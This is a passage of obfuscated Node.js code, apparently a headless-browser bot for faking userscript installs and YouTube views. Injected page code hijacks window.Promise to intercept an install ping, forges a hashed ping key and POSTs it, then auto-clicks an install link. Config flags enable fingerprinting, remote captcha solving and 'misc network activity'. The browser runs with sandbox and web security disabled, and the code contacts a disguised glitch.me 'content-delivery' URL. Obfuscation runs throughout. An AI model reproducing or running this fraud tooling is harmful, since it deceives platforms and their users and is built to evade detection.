-0x13e6 + 0x1ecb] |= (0x1272 * 0x2 + -0x155 + 0x703 * -0x5 | L >> 0x7a * 0x10 + 0x6 * 0x353 + -0x1b86 & -0x39c + 0x3e * -0x99 + 0x28e9) << y[0xb27 + 0x1548 + -0x206c & N++], P[N >> -0x2 * -0x409 + 0xec7 + -0x16d7] |= (-0x2c5 + -0x5e5 * 0x1 + 0x11 * 0x8a | L >> 0x79 * 0x11 + 0x1d7f * 0x1 + -0x12c1 * 0x2 & 0x22b8 + 0x5 * -0x3e6 + -0xefb) << y[-0x7c9 * -0x1 + 0x11 * -0xa9 + 0x373 & N++], P[N >> -0x230c + 0x2096 + 0x278] |= (0x1 * -0x1bf7 + 0x22ba + -0x643 | -0x1d47 + -0x2 * 0x76d + 0x2c60 * 0x1 & L) << y[0x3 * 0x199 + 0x167 + -0x62f * 0x1 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0xe1c + 0x10e2 + 0x2 * -0x143 ? (this['block'] = P[0x109d + 0x101e + -0x20ab], this['start'] = N - (-0x9d0 * 0x2 + 0x1 * 0xf45 + 0x49b), this['hash'](), this['hashed'] = 0x100c + 0x1c01 + -0x1 * 0x2c0c) : this['start'] = N;
                }
                return this['bytes'] > 0xcc431a0b + 0x756d49d4 * -0x1 + 0x202052 * 0x544 && (this['hBytes'] += this['bytes'] / (0x2a890f2c + 0x21f1a0 * 0x1a3 + 0x9de877f4) << 0x1a3 * 0x1 + 0xbec + -0xd8f, this['bytes'] = this['bytes'] % (-0x38a19700 + 0x6d6b74f0 + 0x8 * 0x1966c442)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x2 * 0x1161 + 0xf0f + -0x31d0;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x7b3 + -0x23a + -0x9fd * -0x1] = this['block'], J[K >> -0x2f * 0x21 + 0xe3b * 0x1 + -0x82a] |= x[-0xe7e + 0x1a5 * 0xd + -0x6e0 & K], this['block'] = J[0x10a2 + -0x16ed * 0x1 + 0x65b], K >= -0x15d * -0x1 + 0x38 + -0x1 * 0x15d && (this['hashed'] || this['hash'](), J[-0x3d * 0x72 + 0x49 * 0x4f + 0x4a3] = this['block'], J[0x2630 + -0x1b19 + -0xb07] = J[-0x20a4 + -0x4d * 0x1b + -0x1 * -0x28c4] = J[0x1ba0 + -0x95b * -0x3 + -0x37af] = J[0x77d + 0x128a + -0x1a04] = J[-0xa98 * -0x1 + 0x4b5 * 0x5 + -0x221d * 0x1] = J[-0x3 * -0x50b + -0x21e * -0x4 + -0x1794 * 0x1] = J[-0x2649 + 0x1e48 + -0xf * -0x89] = J[-0x1796 * -0x1 + 0x1124 + -0x1c5 * 0x17] = J[-0x12a5 + -0x5 * -0x5a5 + -0x98c] = J[0x1c6b + 0x2 * -0x789 + -0xd50] = J[0x1660 + 0x19 * -0xe9 + 0x6b] = J[-0x1a6b * 0x1 + -0x1d5a + 0x4 * 0xdf4] = J[-0x195b * 0x1 + -0xd42 * 0x2 + 0x1 * 0x33eb] = J[-0xc05 + 0x1161 + -0x54f] = J[-0x1c * 0x153 + -0x1 * -0x1d9f + 0x783] = J[-0x156d + 0xae3 + 0xa99] = -0x1425 + -0x20 * -0x57 + 0x945), J[0x7bf + 0xd * 0x1d8 + 0x5 * -0x655] = this['hBytes'] << 0x25c1 + 0x11b5 + -0x3773 | this['bytes'] >>> -0x909 + -0x74f * 0x4 + -0x1331 * -0x2, J[-0x1500 + 0x175f + -0x250] = this['bytes'] << 0x1594 + 0xdf2 + 0x1 * -0x2383, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x2b5 + -0x1 * 0x1a57 + 0x17b2; J < -0x155 * 0x12 + 0x1 * 0x1549 + -0x301 * -0x1; ++J)
                K = Q[J - (0x3 * -0x425 + -0x819 + 0x148b)] ^ Q[J - (-0x1e3d + -0x586 + 0x23cb)] ^ Q[J - (0x983 + 0x3 * -0x89b + 0xc * 0x15d)] ^ Q[J - (0xae * -0x1e + 0x17b7 + -0x343)], Q[J] = K << 0xfe1 + -0x1cf * -0x6 + 0x26e * -0xb | K >>> 0xb7f + -0x866 * 0x4 + 0x1638;
              for (J = -0x176 + -0x628 + 0x1a * 0x4b; J < 0x2 * 0x937 + -0xa1c + -0x41f * 0x2; J += 0x67 * 0xb + -0x1c19 + -0x4bd * -0x5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1e0 * 0x14 + 0x4ae + -0x2a29 | L >>> -0xaeb + -0x1 * -0x71f + -0x3 * -0x14d) + (M & N | ~M & O) + P + (-0x1 * 0x7e8c0e1 + -0x990ca6d1 + 0xfb77e14b) + Q[J] << 0x35e + 0x6 * 0x157 + 0x49 * -0x28) << 0x92b + 0x18 * -0x2 + -0x8f6 | P >>> -0x8 * -0xf3 + 0xa04 + 0x1 * -0x1181) + (L & (M = M << 0x1e0d + -0x1d63 * 0x1 + -0x8c | M >>> 0x158c + -0x1d * -0xae + 0xdc0 * -0x3) | ~L & N) + O + (-0x3280d147 * 0x3 + 0x14ae * -0x80d01 + 0x713 * 0x39bef4) + Q[J + (0x53 * 0x44 + -0x1 * 0xbc1 + -0xa4a)] << 0x3 * -0xc9 + -0x1664 * 0x1 + 0x389 * 0x7) << 0x148d + 0x226b + 0x3 * -0x1251 | O >>> 0x20c0 + 0x126a * -0x2 + 0x42f) + (P & (L = L << 0xbb * -0x7 + 0x4cf * -0x4 + -0x1877 * -0x1 | L >>> 0xefd + 0x2e * 0x35 + -0x1881) | ~P & M) + N + (0xa541d5ca + -0x3c4ca3fd + -0xe72b834) + Q[J + (-0x3 * -0x59 + 0x2110 + 0x2219 * -0x1)] << 0x711 + -0x416 + -0x2fb * 0x1) << 0xb93 * -0x1 + -0x1de + 0x1 * 0xd76 | N >>> -0x60b + 0xb7b + -0x555) + (O & (P = P << -0x358 + -0x214 + 0x58a | P >>> 0x1d * 0x5a + 0x12c9 + -0x1cf9) | ~O & L) + M + (0x2ba2998b + -0x7130e71d + 0xa010c72b) + Q[J + (-0x1039 * 0x2 + 0x17b9 + 0xd * 0xac)] << -0x1792 + 0x186c + -0xda) << 0x499 + 0x1bfd + -0x2091 | M >>> 0xb * -0x35c + 0x2112 + -0x1 * -0x3fd) + (N & (O = O << -0x224 * -0xa + 0x97 * 0x1 + -0x15e1 | O >>> -0x8c * 0x39 + -0x3 * 0xb06 + 0x4040) | ~N & P) + L + (-0x1 * 0x55afb42a + -0x149a1 * 0x69a1 + 0x138348504) + Q[J + (-0x1 * -0x1e6f + -0x26b9 * -0x1 + -0x4524)] << 0xaf9 * -0x1 + -0x1160 + 0x1c59, N = N << -0xbc * 0x2a + 0xa4b + -0x8f * -0x25 | N >>> 0x1dac + -0x198c + 0x20f * -0x2;
              for (; J < -0xe4 * -0x27 + 0xe43 + -0x30d7; J += -0x25d8 * -0x1 + 0x8c7 + -0x952 * 0x5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1a38 + 0x4e2 + 0x155b | L >>> -0x1ef8 + 0x1189 + 0xd8a) + (M ^ N ^ O) + P + (-0x1 * 0xab7f10e9 + 0x9abeea7d + -0x1 * -0x7f9a120d) + Q[J] << -0x47d + 0x1b01 + -0x1684) << -0x19e2 + -0x1 * -0xc11 + 0xdd6 | P >>> -0x4ff + 0x2f4 * 0xd + -0x214a) + (L ^ (M = M << 0x16a2 + -0x56 * 0xb + -0x12d2 | M >>> 0x1 * -0x358 + -0x14c4 + 0x1 * 0x181e) ^ N) + O + (-0x5 * 0x12afc423 + 0xdac0c554 + -0xe780504) + Q[J + (-0x2 * -0x2a7 + -0x179a + 0x124d)] << -0xe50 + 0x20 * 0x18 + 0x10 * 0xb5) << 0x22d7 * -0x1 + -0x16b * -0x1 + -0x1 * -0x2171 | O >>> 0x56 + -0x17 * 0xf9 + 0x1624) + (P ^ (L = L << -0xf * -0x137 + -0xf0b + 0x62 * -0x8 | L >>> 0x55 * 0x2 + -0x8bf + 0x817) ^ M) + N + (0xd5 * 0x133fde + -0x5fc0bc53 + 0xbe96843e) + Q[J + (0x1f67 * -0x1 + 0x2426 + -0x4bd)] << -0x1c3a * 0x1 + -0x140 + 0x1d7a) << -0x208b * -0x1 + -0xa75 + -0x7 * 0x327 | N >>> 0x17e0 + 0x15a3 * 0x1 + -0x5ad * 0x8) + (O ^ (P = P << 0xdcd + 0x1781 + 0x50 * -0x77 | P >>> 0x824 + -0x2356 + -0x2 * -0xd9a) ^ L) + M + (-0x3 * 0x197d3409 + -0x6487cdba * -0x1 + 0x56c9ba02) + Q[J + (-0x60a * 0x5 + 0x25e8 + -0x7b3)] << 0x1d40 + -0x17 * 0x102 + -0x6 * 0x103) << 0x674 * 0x4 + -0x254d + 0xb82 | M >>> 0x48a * 0x1 + -0x3b * 0x9d + 0x20 * 0xfe) + (N ^ (O = O << 0x10e5 + 0x19c9 + 0x718 * -0x6 | O >>> -0x961 * -0x1 + 0x2123 + -0x1 * 0x2a82) ^ P) + L + (0x1 * -0x33101242 + -0x7d391d93 + -0x11f231b76 * -0x1) + Q[J + (0xa2d + 0x2 * -0x9a9 + -0x7 * -0x14f)] << 0x1c09 + 0x1a08 + -0x3611, N = N << 0x2681 + 0x2 * -0x119 + -0x2431 | N >>> 0x23e3 * -0x1 + 0x2b6 + 0x212f;
              for (; J < -0x1856 + 0x257 * -0x1 + 0x1ae9; J += 0x534 + -0x3e9 * -0x4 + -0x14d3 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2af + -0x6cc + 0x980 | L >>> -0x1777 + -0xc14 + 0x1 * 0x23a6) + (M & N | M & O | N & O) + P - (0xd8059aa1 + 0x29408ac9 * 0x3 + -0xe2e2f7d8) + Q[J] << -0x4f3 * -0x5 + 0x2120 + -0x39df) << 0x63 * 0x61 + 0x74c + 0x126 * -0x27 | P >>> -0x6 * -0x4b5 + -0x2110 + -0x61 * -0xd) + (L & (M = M << 0x6a7 + 0x305 * 0x5 + 0x47 * -0x4e | M >>> 0x1 * -0x225f + 0xb27 + -0x173a * -0x1) | L & N | M & N) + O - (-0x36b26ea * -0x2e + -0x198d55 * -0x351 + -0xa72f7 * 0xc5b) + Q[J + (-0x230e + 0x19ca + 0x945)] << -0x1371 + -0x1 * 0x1e83 + 0x18fa * 0x2) << -0x4 * 0x10 + 0x3 * -0x4db + 0xed6 | O >>> -0x8b * -0x1a + -0x259d * -0x1 + -0x33a0) + (P & (L = L << 0xd1c + -0x71 * 0x4d + 0x14ff | L >>> 0x20 * -0x6d + -0x15ee + 0x1 * 0x2390) | P & M | L & M) + N - (-0x5 * 0x1be8140c + -0x7fac7aca + 0xbe0c9115 * 0x2) + Q[J + (-0x1987 + 0x385 * 0x9 + -0x2 * 0x312)] << 0x1d8a + -0x1ba8 + 0x2 * -0xf1) << -0x2100 + -0x11ef + 0x32f4 | N >>> 0x3ba + -0x2086 + -0x31 * -0x97) + (O & (P = P << -0x25ce + 0x473 * 0x3 + -0x1b * -0xe9 | P >>> 0x9a9 * -0x4 + 0x975 + 0x1d31) | O & L | P & L) + M - (0x86a6583c + -0x9bd725a0 + -0xe231e * -0x97c) + Q[J + (-0x2 * -0x11ef + -0x17ad * 0x1 + -0xc2e)] << -0xdb2 + 0x1 * 0x228b + -0x3 * 0x6f3) << -0x83a + -0xb * -0x247 + -0x2cd * 0x6 | M >>> -0x208a * 0x1 + 0x1 * -0xc9d + 0x2d42) + (N & (O = O << 0x16c9 + 0x170f + -0x2dba | O >>> -0x12ef * 0x2 + 0x14d3 + 0x110d) | N & P | O & P) + L - (-0x25ed3369 * -0x1 + -0x1a7fece + 0x4c9f0e89) + Q[J + (0x33b * 0x4 + 0x17aa + -0x2492 * 0x1)] << 0x1 * 0x23e + -0x2 * 0x6e6 + 0xb8e, N = N << -0x1 * 0x1ffb + -0x5a + 0x39b * 0x9 | N >>> 0xaf9 * 0x3 + 0x1 * 0x194c + 0x3 * -0x1367;
              for (; J < 0x22ad + 0x1b35 * -0x1 + -0x728; J += 0x7 * 0x2cf + -0x8d3 + 0xd * -0xd5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2338 + -0x23c2 + -0x5 * -0xe33 | L >>> -0x19e2 + -0x1fea + -0x66f * -0x9) + (M ^ N ^ O) + P - (-0x26f6ac57 + -0x392c14b3 + 0x95bfff34) + Q[J] << -0x1c2f + 0x1ab4 + 0x17b) << -0x26c4 + -0x1b4b + 0x4214 | P >>> -0x1 * -0x1e87 + -0x2330 + 0x4c4) + (L ^ (M = M << -0x2239 + 0x1a24 + 0x833 * 0x1 | M >>> 0x1 * 0x1b93 + 0x7 * -0x24b + -0x10c * 0xb) ^ N) + O - (-0x2e37dd3 * -0x8 + 0x3b * 0x1385381 + 0x32197 * -0xd3f) + Q[J + (-0x26e0 + -0x11 * 0x68 + 0x2dc9)] << -0x685 + -0xb * 0x144 + 0x1 * 0x1471) << 0xb2 * 0x2b + -0x29 * 0x9d + 0x6 * -0xca | O >>> 0x2219 + -0x2 * -0x320 + -0x283e) + (P ^ (L = L << 0x19dd * -0x1 + 0x1d4a + -0x34f | L >>> -0x134f + -0x26a7 + -0x8 * -0x73f) ^ M) + N - (-0xefba6 * 0x293 + -0x187ef303 + 0x74adfd7f) + Q[J + (0x1e02 + 0x2 * -0x1085 + -0x2 * -0x185)] << 0x1fe7 + -0xb02 + 0x14e5 * -0x1) << 0x1575 + -0x11 * -0x1a4 + -0x16 * 0x23e | N >>> 0x16d0 + -0x179 * -0x5 + -0x1 * 0x1e12) + (O ^ (P = P << 0x89 * 0x1 + -0x1 * 0x7ba + 0x74f | P >>> 0x186 * -0xa + -0x1feb + 0x2f29) ^ L) + M - (-0x46c28d38 + 0x3589fd35 + -0x35f83b9 * -0x15) + Q[J + (-0x1d8c + 0xf3 + -0x727 * -0x4)] << -0x1 * -0x1087 + 0x1ca0 + -0x2d27) << 0x5 * 0x244 + -0x876 + -0x2d9 | M >>> -0x69c + 0x10a9 + 0x13 * -0x86) + (N ^ (O = O << 0x2 * -0x659 + -0x1 * 0x12a1 + 0x1f71 | O >>> 0x1e91 + 0x1cdb + 0x5f1 * -0xa) ^ P) + L - (-0x6720ee38 + -0x5ac4c91d + 0xf782f57f) + Q[J + (-0x12c7 + 0x23d * -0xd + 0x2fe4)] << -0x5f7 * 0x1 + -0x1 * -0x853 + 0x97 * -0x4, N = N << 0x325 * -0x1 + -0x82f + 0xb72 | N >>> 0x1 * -0x1dc3 + 0x198f + -0x1 * -0x436;
              this['h0'] = this['h0'] + L << -0x4f * -0x13 + 0x1 * 0x1413 + -0x19f * 0x10, this['h1'] = this['h1'] + M << 0xe * -0x113 + 0x1ee * -0x7 + 0x1c8c, this['h2'] = this['h2'] + N << -0x2 * -0xbfb + -0x16bd * 0x1 + -0x1 * 0x139, this['h3'] = this['h3'] + O << 0x2175 + 0x23c * 0x10 + -0x9e3 * 0x7, this['h4'] = this['h4'] + P << -0xb29 * -0x1 + 0x57d * 0x4 + -0x4bb * 0x7;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1ccf + 0x3 * -0x33f + -0x652 * 0x3 & 0x53 * -0x3 + 0x311 * -0xb + -0x22c3 * -0x1] + w[J >> 0x79 * 0x29 + 0x1142 + 0x248b * -0x1 & -0x238b + -0x1339 + 0x36d3] + w[J >> -0x13 * -0x29 + 0x13c5 + -0x16bc & 0x1879 + 0x175 * 0x13 + -0x3419] + w[J >> 0x15 * 0x90 + 0x1 * -0x1b9f + 0xef * 0x11 & -0x16c7 + 0x819 + -0xebd * -0x1] + w[J >> -0x253b + -0x3eb * 0x6 + -0x75 * -0x85 & -0x1d * -0x137 + -0x91f * 0x1 + -0xf7 * 0x1b] + w[J >> 0x2 * 0x927 + -0x1fd8 + 0xd92 & 0x20c9 + 0x4f + -0x2109] + w[J >> 0x26cc + 0x1817 + -0x3edf & -0xa86 + -0x19 * -0x7a + -0x1 * 0x155] + w[0x496 * -0x3 + 0x1f9b + -0x11ca & J] + w[K >> -0x21b * 0x1 + 0x1890 + -0x1659 & -0x1341 + -0x751 * 0x3 + 0xdc1 * 0x3] + w[K >> -0xcc4 + -0x1 * -0x13a9 + -0x1 * 0x6cd & 0xd * 0x27e + -0x22ed + 0x1 * 0x296] + w[K >> 0x136d * 0x2 + -0x1b * -0x13d + -0x5 * 0xe71 & -0xb * 0xca + 0x567 * -0x6 + -0x31 * -0xd7] + w[K >> -0x23c5 * -0x1 + -0x186b + -0xb4a & 0x1c11 + -0x1283 * 0x1 + 0xdd * -0xb] + w[K >> 0xf8f + -0xcde + -0x2a5 & 0xb9d + 0xcd * -0x25 + 0x1213] + w[K >> -0x65 + -0x1bc0 + 0x1c2d & 0xe9 + -0x835 * -0x4 + 0x10d7 * -0x2] + w[K >> -0x1865 + -0x3 * 0x339 + -0x885 * -0x4 & -0x6 * -0x4ad + 0x9b3 * -0x1 + -0x2 * 0x926] + w[0xaef * -0x3 + -0x20fb * 0x1 + 0x41d7 & K] + w[L >> -0x1621 + 0x1 * 0x21c9 + -0xb8c * 0x1 & 0xb * 0x1ef + 0x13aa + -0x28e0] + w[L >> -0x13b * -0x2 + 0x1d * -0x89 + -0xd27 * -0x1 & -0x6fd * 0x5 + -0x1f56 + 0x4256] + w[L >> -0x2645 + 0x21e0 + 0x479 & 0x921 * -0x1 + 0x350 + 0x5e0] + w[L >> 0x1 * 0x577 + -0x54a * -0x7 + -0x2a6d * 0x1 & -0x95b + 0x211e + 0x2 * -0xbda] + w[L >> -0x1af5 + 0x1dea + -0x2e9 & 0x296 * -0x1 + -0x26d6 + 0x297b * 0x1] + w[L >> -0x2251 * -0x1 + 0x2 * 0x167 + -0x2517 & -0x23 * -0xf1 + 0x1b3f + 0x3c23 * -0x1] + w[L >> 0x8 * -0x23b + 0x22 * -0x8f + 0x24da & 0x52 * 0x4e + 0xd9f * 0x1 + -0x1 * 0x268c] + w[0x1 * 0x679 + 0x1220 + -0x188a & L] + w[M >> -0xa * -0x4d + -0x609 + -0x1 * -0x323 & -0xdd1 * -0x2 + -0x190e + -0x285] + w[M >> -0x46b + 0x10 * 0x12f + 0xe6d * -0x1 & -0x2313 * -0x1 + 0x5 * -0x1cb + -0x1a0d] + w[M >> 0x1d2b * -0x1 + 0x1f51 * -0x1 + 0x22 * 0x1c8 & 0x2126 + 0x1 * -0xae7 + 0x8e * -0x28] + w[M >> -0x1f * -0x100 + -0x20b * -0xb + -0x3569 & -0x20c + -0x1 * 0xe71 + -0x1 * -0x108c] + w[M >> -0x382 * -0xa + 0x1 * -0x71e + -0x1bea & -0x4 * -0x2d3 + -0x1 * -0x2630 + -0x316d] + w[M >> -0xc0b * -0x3 + 0x23 * -0xc7 + -0x1 * 0x8e4 & 0x6 * 0x53 + -0x851 + 0x1 * 0x66e] + w[M >> -0x9 * -0x260 + 0x33 * 0x46 + -0x234e & -0x4cb * 0x3 + 0x1 * -0x247d + 0x32ed * 0x1] + w[0x12 * -0x218 + 0x569 + 0x2056 & M] + w[N >> 0x20a * -0x8 + 0x157 * 0xe + -0x256 & 0x158b + 0x1 * 0x1cfd + -0x3279] + w[N >> -0x1 * -0x791 + 0xc3e * 0x3 + 0x1 * -0x2c33 & 0x4 * 0x68e + 0x2 * -0x105 + -0x145 * 0x13] + w[N >> -0x2554 + 0x24ef + 0x79 & 0x109f + -0x160d + 0x5 * 0x119] + w[N >> -0x252c + 0x22ec + -0x128 * -0x2 & 0x11f1 + -0x2388 + 0x11a6] + w[N >> 0x10e4 + 0x1aa + -0x1282 & 0x73 + 0x6f1 + 0x1 * -0x755] + w[N >> 0x1eda + -0xf3c + -0xf96 & -0x263 * 0x3 + -0x791 + 0x1 * 0xec9] + w[N >> -0xb89 + 0xdc4 + -0x237 & -0x1 * -0xadb + 0x49d * -0x7 + 0x157f] + w[0x723 + 0x4 * 0x4ff + -0x1b10 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x89 * -0x1f + 0x1938 + 0x1 * -0x889 & 0xad * -0x33 + 0x1e8f + 0x4e7,
                J >> 0x1 * -0x676 + 0x2 * -0x71 + -0x1 * -0x768 & 0x2413 + 0x73b * -0x5 + 0x5 * 0x37,
                J >> 0xa7a + 0x223e + -0x2cb0 & -0x16b5 + -0x59a + -0x1 * -0x1d4e,
                -0x14d * -0x18 + -0x1f94 + -0x15b * -0x1 & J,
                K >> 0x54c + -0x244e + -0x1f1a * -0x1 & 0x55 * -0x67 + 0x79c + 0x1b96,
                K >> 0x4 * 0x22b + 0x1c8a + -0x631 * 0x6 & 0x5a * 0x2b + 0x63d + -0x145c,
                K >> 0x1d61 + 0x3 * 0x375 + -0x3e * 0xa4 & 0x643 + -0x1205 * 0x2 + 0x1ec6,
                -0xb8f * -0x3 + 0x1e * 0x125 + -0x4404 & K,
                L >> 0x2255 + 0xfe5 + 0x2c9 * -0x12 & -0x60f * 0x1 + -0x13f1 + 0x1 * 0x1aff,
                L >> -0x5f1 + -0x349 * 0x4 + 0x1325 & 0x25e + -0xc * 0x1cd + 0x143d,
                L >> 0x784 + 0x1a21 + -0x219d & -0x13 * 0x63 + 0x11 * -0x37 + 0x1 * 0xbff,
                0x1a85 + 0x1a5b + -0xe9 * 0x39 & L,
                M >> 0x1a * 0x12d + -0x15db + -0x89f & -0x2 * -0x54a + 0x1 * 0x6dd + 0x839 * -0x2,
                M >> -0x2301 + -0x767 + 0x48 * 0x97 & -0x136c + -0xed * -0x2 + 0x7 * 0x2a7,
                M >> 0x1496 + -0x9c * -0x1f + 0x1b * -0x176 & 0x2035 + -0x2316 + 0x3e0,
                -0x226f + -0x1 * 0xde9 + 0x1 * 0x3157 & M,
                N >> -0x1fb3 + -0x871 * 0x3 + 0x391e & 0x4f * 0xa + 0x388 * 0x2 + -0x927,
                N >> -0x243e + -0x161b + 0x1 * 0x3a69 & -0x1dbe + -0x58 * -0x3e + -0x13 * -0x7f,
                N >> -0xf93 * 0x1 + 0x91 * 0x2a + 0x82f * -0x1 & -0x4e8 + 0x14f2 + -0xf0b * 0x1,
                -0x889 + 0x185f + -0xed7 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x209c + 0x1f03 * 0x1 + 0x21 * 0xd), (K = new DataView(J))['setUint32'](0x2 * -0x1066 + -0xaff + 0xe99 * 0x3, this['h0']), K['setUint32'](0x17 * -0x91 + -0x11 * 0xbd + 0x1998, this['h1']), K['setUint32'](0x22f7 * 0x1 + 0xd4 + -0x23c3, this['h2']), K['setUint32'](0x1913 * 0x1 + -0x2426 + 0xdb * 0xd, this['h3']), K['setUint32'](0x194e + -0x1a6 * -0x10 + -0x339e, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1 * -0x2607 + -0x2 * 0x5f4 + 0x3 * -0x8b5];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x13a * 0x3 + 0x2 * 0x1165 + -0x2678;
            J[0x2179 + 0x1 * -0xe1b + -0x135e]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x25d9 * -0x1 + 0x7 * -0x191 + 0x1f * -0xde] = L => {
              const X = c,
                W = d;
              let M = I[W(0x10) + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I[X(0x1b) + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x31 * 0x2 + 0x1 * -0x1c2e + 0x1bcd * 0x1), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x5 * -0x1d + -0x2 * -0xaca + -0x1502;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x10f * -0x1 + -0xfa5 + 0x1472), Promise['resolve'](-0x67d + -0x138e + 0xd06 * 0x2);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1297 + 0x163 * -0x1 + 0x13fa * 0x1; j < -0x171e * 0x1 + -0x1226 * -0x1 + -0x43 * -0x13; j++)
    i();
}
const NETWORK_PATIENCE = 0x1d6 * -0x6 + -0x20b3 + 0x3 * 0x18fd + (-0x203d + -0x1 * -0x116 + 0x2adf) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x96f + 0x5 * 0x4db + -0x21b3 * 0x1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x4e8 * 0x4 + 0xfd1 + -0x2371; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 